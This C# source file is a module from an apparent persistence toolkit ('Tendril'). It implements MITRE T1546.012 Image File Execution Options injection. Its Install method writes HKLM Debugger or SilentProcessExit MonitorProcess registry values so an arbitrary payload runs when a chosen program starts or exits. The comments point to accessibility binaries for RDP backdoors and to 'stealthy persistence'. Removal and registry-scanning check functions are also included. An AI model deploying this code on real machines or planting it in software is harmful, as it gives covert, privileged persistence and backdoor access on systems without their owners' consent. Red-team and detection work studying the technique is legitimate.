using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Image File Execution Options Injection (T1546.012)
    ///
    /// Two variants:
    ///   1. Classic IFEO Debugger: sets Debugger value so the payload launches
    ///      whenever the target process starts. The target process becomes an
    ///      argument to the debugger (payload).
    ///   2. SilentProcessExit: sets GlobalFlag + MonitorProcess so the payload
    ///      launches when the target process *exits*. More evasive - the trigger
    ///      is process termination rather than creation.
    ///
    /// Both require admin (HKLM). Commonly targets accessibility binaries
    /// (sethc.exe, utilman.exe, narrator.exe) for RDP backdoors, or targets
    /// legitimate update processes for stealthy persistence.
    /// </summary>
    public class IFEOInjection : ITendril
    {
        public string Name { get { return "IFEOInjection"; } }
        public string Description { get { return "IFEO debugger or SilentProcessExit monitor - runs on process start/exit"; } }
        public string MitreId { get { return "T1546.012"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string IFEOPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
        private const string SilentExitPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit";

        // FLG_MONITOR_SILENT_PROCESS_EXIT
        private const int GlobalFlagSilentExit = 0x200;
        // ReportingMode: launch monitor process
        private const int ReportingModeLaunch = 0x1;

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string target, payload, mode;
            if (!options.TryGetValue("target", out target))
                target = "notepad.exe"; // safe default for testing

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<command_or_path>");

            if (!options.TryGetValue("mode", out mode))
                mode = "debugger"; // "debugger" or "silent"

            string ifeoKeyPath = IFEOPath + @"\" + target;

            if (mode.ToLower() == "silent")
            {
                // SilentProcessExit variant: trigger on process exit
                // Step 1: Set GlobalFlag in IFEO to enable silent exit monitoring
                RegistryUtils.SetRegDword("HKLM", ifeoKeyPath, "GlobalFlag", GlobalFlagSilentExit);

                // Step 2: Configure the monitor process in SilentProcessExit
                string silentKeyPath = SilentExitPath + @"\" + target;
                RegistryUtils.SetRegDword("HKLM", silentKeyPath, "ReportingMode", ReportingModeLaunch);
                RegistryUtils.SetRegValue("HKLM", silentKeyPath, "MonitorProcess", payload);

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("SilentProcessExit monitor installed for {0}", target))
                    .WithMeta("Target", target)
                    .WithMeta("Mode", "SilentProcessExit")
                    .WithMeta("MonitorProcess", payload)
                    .WithMeta("Trigger", "Process exit");
            }
            else
            {
                // Classic IFEO debugger
                RegistryUtils.SetRegValue("HKLM", ifeoKeyPath, "Debugger", payload);

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("IFEO debugger installed for {0}", target))
                    .WithMeta("Target", target)
                    .WithMeta("Mode", "Debugger")
                    .WithMeta("Debugger", payload)
                    .WithMeta("Trigger", "Process start");
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string target, mode;
            if (!options.TryGetValue("target", out target))
                target = "notepad.exe";
            if (!options.TryGetValue("mode", out mode))
                mode = "debugger";

            if (mode.ToLower() == "silent")
            {
                string ifeoKeyPath = IFEOPath + @"\" + target;
                RegistryUtils.DeleteRegValue("HKLM", ifeoKeyPath, "GlobalFlag");
                RegistryUtils.DeleteRegKeyTree("HKLM", SilentExitPath + @"\" + target);
            }
            else
            {
                string ifeoKeyPath = IFEOPath + @"\" + target;
                RegistryUtils.DeleteRegValue("HKLM", ifeoKeyPath, "Debugger");
            }

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("IFEO persistence removed for {0}", target));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            // Scan IFEO for Debugger values
            string[] targets = RegistryUtils.GetRegSubkeys("HKLM", IFEOPath);
            foreach (string target in targets)
            {
                string keyPath = IFEOPath + @"\" + target;
                string debugger = RegistryUtils.GetRegValue("HKLM", keyPath, "Debugger");
                if (!string.IsNullOrEmpty(debugger))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("IFEO Debugger on {0}: {1}", target, debugger))
                        .WithMeta("Target", target)
                        .WithMeta("Debugger", debugger)
                        .WithMeta("Mode", "Debugger"));
                }

                // Check for SilentProcessExit GlobalFlag
                string globalFlag = RegistryUtils.GetRegValue("HKLM", keyPath, "GlobalFlag");
                if (!string.IsNullOrEmpty(globalFlag))
                {
                    int flag;
                    if (int.TryParse(globalFlag, out flag) && (flag & GlobalFlagSilentExit) != 0)
                    {
                        string silentPath = SilentExitPath + @"\" + target;
                        string monitor = RegistryUtils.GetRegValue("HKLM", silentPath, "MonitorProcess");
                        results.Add(new TendrilResult(ResultStatus.Warning, Name,
                            string.Format("SilentProcessExit on {0}: {1}", target, monitor ?? "unknown"))
                            .WithMeta("Target", target)
                            .WithMeta("MonitorProcess", monitor ?? "not set")
                            .WithMeta("Mode", "SilentProcessExit"));
                    }
                }
            }

            return results;
        }
    }
}
